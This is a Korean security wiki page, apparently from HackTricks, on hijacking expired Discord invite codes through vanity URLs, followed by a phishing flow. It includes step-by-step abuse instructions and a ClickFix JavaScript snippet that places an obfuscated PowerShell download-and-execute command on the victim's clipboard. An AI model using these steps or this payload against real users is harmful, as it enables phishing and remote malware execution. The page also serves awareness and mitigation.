# Discord 초대 코드 탈취

{{#include ../../banners/hacktricks-training.md}}

Discord의 초대 시스템 취약점은 위협 행위자가 만료되거나 삭제된 초대 코드를 새로운 맞춤 링크로 주장할 수 있게 합니다(임시, 영구 또는 사용자 정의). 모든 코드를 소문자로 정규화함으로써, 공격자는 알려진 초대 코드를 사전 등록하고 원래 링크가 만료되거나 소스 서버의 부스트가 사라지면 조용히 트래픽을 탈취할 수 있습니다.

## 초대 유형 및 탈취 위험

| 초대 유형               | 탈취 가능? | 조건 / 비고                                                                                             |
|-----------------------|-------------|--------------------------------------------------------------------------------------------------------|
| 임시 초대 링크         | ✅          | 만료 후, 코드는 사용 가능해지며 부스트 서버에 의해 맞춤 URL로 재등록될 수 있습니다.                     |
| 영구 초대 링크         | ⚠️          | 삭제되고 소문자와 숫자로만 구성된 경우, 코드는 다시 사용 가능해질 수 있습니다.                          |
| 사용자 정의 맞춤 링크  | ✅          | 원래 서버가 Level 3 Boost를 잃으면, 해당 맞춤 초대는 새로운 등록을 위해 사용 가능해집니다.            |

## 악용 단계

1. 정찰
- `discord.gg/{code}` 또는 `discord.com/invite/{code}` 패턴과 일치하는 초대 링크를 위해 공개 소스(포럼, 소셜 미디어, 텔레그램 채널)를 모니터링합니다.
- 관심 있는 초대 코드를 수집합니다(임시 또는 맞춤).
2. 사전 등록
- Level 3 Boost 권한이 있는 Discord 서버를 생성하거나 기존 서버를 사용합니다.
- **서버 설정 → 맞춤 URL**에서 대상 초대 코드를 할당하려고 시도합니다. 수락되면, 코드는 악의적인 서버에 의해 예약됩니다.
3. 탈취 활성화
- 임시 초대의 경우, 원래 초대가 만료될 때까지 기다립니다(또는 소스를 제어하는 경우 수동으로 삭제합니다).
- 대문자가 포함된 코드의 경우, 소문자 변형은 즉시 주장할 수 있지만, 리디렉션은 만료 후에만 활성화됩니다.
4. 조용한 리디렉션
- 사용자가 이전 링크를 방문하면 탈취가 활성화된 후 공격자가 제어하는 서버로 원활하게 전송됩니다.

## Discord 서버를 통한 피싱 흐름

1. 서버 채널을 제한하여 **#verify** 채널만 보이도록 합니다.
2. 신규 사용자가 OAuth2를 통해 인증하도록 유도하는 봇(예: **Safeguard#0786**)을 배포합니다.
3. 봇이 사용자를 피싱 사이트(예: `captchaguard.me`)로 리디렉션합니다. 이는 CAPTCHA 또는 인증 단계의 가장을 씁니다.
4. **ClickFix** UX 트릭을 구현합니다:
- 깨진 CAPTCHA 메시지를 표시합니다.
- 사용자가 **Win+R** 대화 상자를 열고 미리 로드된 PowerShell 명령을 붙여넣고 Enter를 누르도록 안내합니다.

### ClickFix 클립보드 주입 예시
```javascript
// Copy malicious PowerShell command to clipboard
const cmd = `powershell -NoExit -Command "$r='NJjeywEMXp3L3Fmcv02bj5ibpJWZ0NXYw9yL6MHc0RHa';` +
`$u=($r[-1..-($r.Length)]-join '');` +
`$url=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($u));` +
`iex (iwr -Uri $url)"`;
navigator.clipboard.writeText(cmd);
```
이 접근 방식은 직접 파일 다운로드를 피하고 사용자 의심을 줄이기 위해 친숙한 UI 요소를 활용합니다.

## 완화 조치

- 최소한 하나의 대문자 또는 비알파벳 문자가 포함된 영구 초대 링크를 사용하세요 (만료되지 않으며 재사용할 수 없음).
- 정기적으로 초대 코드를 변경하고 오래된 링크를 취소하세요.
- Discord 서버 부스트 상태 및 맞춤 URL 청구를 모니터링하세요.
- 사용자에게 서버의 진위를 확인하고 클립보드에 붙여넣은 명령을 실행하지 않도록 교육하세요.

## 참고 문헌

- From Trust to Threat: Hijacked Discord Invites Used for Multi-Stage Malware Delivery – [https://research.checkpoint.com/2025/from-trust-to-threat-hijacked-discord-invites-used-for-multi-stage-malware-delivery/](https://research.checkpoint.com/2025/from-trust-to-threat-hijacked-discord-invites-used-for-multi-stage-malware-delivery/)
- Discord Custom Invite Link Documentation – [https://support.discord.com/hc/en-us/articles/115001542132-Custom-Invite-Link](https://support.discord.com/hc/en-us/articles/115001542132-Custom-Invite-Link)

{{#include ../../banners/hacktricks-training.md}}
